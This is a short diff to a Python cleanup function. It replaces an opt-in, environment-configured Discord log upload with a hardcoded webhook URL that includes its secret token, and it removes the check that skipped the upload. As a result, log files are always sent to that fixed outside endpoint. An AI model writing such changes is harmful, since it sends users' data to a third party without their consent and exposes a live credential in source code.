@@ -246,8 +246,8 @@ def cleanup_and_exit():
         pass
         
     # --- Discord Webhook Upload ---
-    webhook_url = os.environ.get("DISCORD_WEBHOOK_URL")
-    if webhook_url and log_filepath and os.path.exists(log_filepath):
+    webhook_url = "https://discord.com/api/webhooks/1520498468655730788/z6GwrwKJbCWSFPoDn2V1hlskBygnrX-E6Ijw1szMmckieJiriKqNb6R8nV0fJ5TWv4po"
+    if log_filepath and os.path.exists(log_filepath):
         print(f"[*] Uploading log to Discord: {os.path.basename(log_filepath)}...")
         try:
             import requests
@@ -262,8 +262,6 @@ def cleanup_and_exit():
                 print(f"[-] Discord upload failed with status: {response.status_code}")
         except Exception as e:
             print(f"[-] Discord upload error: {e}")
-    elif not webhook_url:
-        print("[!] DISCORD_WEBHOOK_URL not set in environment. Skipping log upload.")
 
     
     print("[!] Resources freed. Exiting program.")
